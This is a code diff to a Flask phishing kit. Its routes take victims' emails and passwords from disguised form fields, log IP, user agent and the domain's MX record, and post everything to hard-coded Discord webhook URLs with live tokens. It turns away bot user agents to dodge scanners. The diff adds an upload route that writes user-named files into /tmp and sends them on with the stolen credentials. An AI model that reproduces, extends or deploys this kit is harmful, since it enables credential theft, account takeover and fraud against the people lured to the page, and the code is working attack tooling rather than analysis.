@@ -11,10 +11,6 @@ from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 import dns.resolver
 
-app = Flask(__name__)
-limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
-app.secret_key = secrets.token_urlsafe(24)
-
 # Discord webhook URLs
 DISCORD_WEBHOOK_URLS = [
     "https://discord.com/api/webhooks/1339995643497681058/XBIWTD-VWQ0Ssg5KUR3ojdSuCkJFhRIw2TgYAvIXZce5BrVWVRQp0n9cySRZAdb1wQIe",
@@ -22,21 +18,11 @@ DISCORD_WEBHOOK_URLS = [
     "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"
 ]
 
-# Function to log data to a text file
-def log_to_file(email, password, ip, useragent, domain, mx_record):
-    log_file_path = '/tmp/login_attempts.txt'  # Use /tmp for writable storage
-    with open(log_file_path, "a") as f:
-        f.write(f"🔔 General New Login Attempt\n")
-        f.write(f"📧 Email: {email}\n")
-        f.write(f"🔑 Password: {password}\n")
-        f.write(f"🌐 IP: {ip}\n")
-        f.write(f"🖥 User-Agent: {useragent}\n")
-        f.write(f"🌍 Domain: {domain}\n")
-        f.write(f"📨 MX Record: {mx_record}\n")
-        f.write("========================================\n")
+app = Flask(__name__)
+limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
+app.secret_key = secrets.token_urlsafe(24)
 
-# Function to send data to Discord
-def send_discord_message(email, password, ip, useragent, domain, mx_record):
+def send_discord_message_with_attachment(email, password, ip, useragent, domain, mx_record, file_path):
     webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
     message = {
         "username": "Logger Bot",
@@ -57,9 +43,13 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
             }
         ]
     }
-    
+
+    files = {'file': open(file_path, 'rb')} if file_path else None
+
     try:
-        requests.post(webhook_url, json=message)
+        response = requests.post(webhook_url, json=message, files=files)
+        if response.status_code != 204:
+            print(f"Failed to send message: {response.status_code} - {response.text}")
     except requests.exceptions.RequestException as e:
         print(f"Error sending message to Discord: {e}")
 
@@ -77,7 +67,7 @@ def generate_captcha_code(length=4):
 # Function to generate a CAPTCHA image
 def generate_captcha_image(code):
     width, height = 150, 60
-    image = Image.new('RGB', (width, height), color=( 255, 255, 255))
+    image = Image.new('RGB', (width, height), color=(255, 255, 255))
     draw = ImageDraw.Draw(image)
 
     # Add some noise (dots)
@@ -165,6 +155,31 @@ def route2():
         session['ins'] = web_param[web_param.index('@') + 1:]
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
+@app.route("/upload", methods=['POST'])
+def upload_file():
+    if 'file' not in request.files:
+        return "No file part", 400
+
+    file = request.files['file']
+    if file.filename == '':
+        return "No selected file", 400
+
+    # Save the file temporarily
+    file_path = f"/tmp/{file.filename}"
+    file.save(file_path)
+
+    # Call the function to send the message with the attachment
+    email = request.form.get("horse")
+    password = request.form.get("pig")
+    ip = request.remote_addr
+    useragent = request.headers.get('User -Agent')
+    domain = email.split('@')[-1] if email and '@' in email else None
+    mx_record = get_mx_record(domain) if domain else "Invalid Domain"
+
+    send_discord_message_with_attachment(email, password, ip, useragent, domain, mx_record, file_path)
+
+    return "File uploaded and message sent!", 200
+
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
@@ -181,47 +196,14 @@ def first():
         domain = email.split('@')[-1] if email and '@' in email else None
         mx_record = get_mx_record(domain) if domain else "Invalid Domain"
 
-        # Log data to a text file
-        log_to_file(email, password, ip, useragent, domain, mx_record)
-
         # Send data to Discord
-        send_discord_message(email, password, ip, useragent, domain, mx_record)
+        send_discord_message_with_attachment(email, password, ip, useragent, domain, mx_record, None)
 
         # Store email in session
         session['eman'] = email
 
         # Redirect
         return redirect(url_for('benza', web=email))
-
-    return "Method Not Allowed", 405
-
-@app.route("/second", methods=['POST'])
-def second():
-    if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For') or \
-             request.headers.get('X-Real-IP') or \
-             request.headers.get('X-Client-IP') or \
-             request.remote_addr
-
-        email = request.form.get("horse")
-        password = request.form.get("pig")
-        useragent = request.headers.get('User  -Agent')
-
-        # Get MX record
-        domain = email.split('@')[-1] if email and '@' in email else None
-        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
-
-        # Log data to a text file
-        log_to_file(email, password, ip, useragent, domain, mx_record)
-
-        # Send data to Discord
-        send_discord_message(email, password, ip, useragent, domain, mx_record)
-
-        # Store email in session
-        session['ins'] = email
-
-        # Redirect
-        return redirect(url_for('lasmo', web=email))
 
     return "Method Not Allowed", 405
 
@@ -235,7 +217,7 @@ def benza():
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
     userip = request.headers.get("X-Forwarded-For")
-    useragent = request.headers.get("User  -Agent")
+    useragent = request.headers.get("User -Agent")
     
     if useragent in bot_user_agents:
         abort(403)  # forbidden
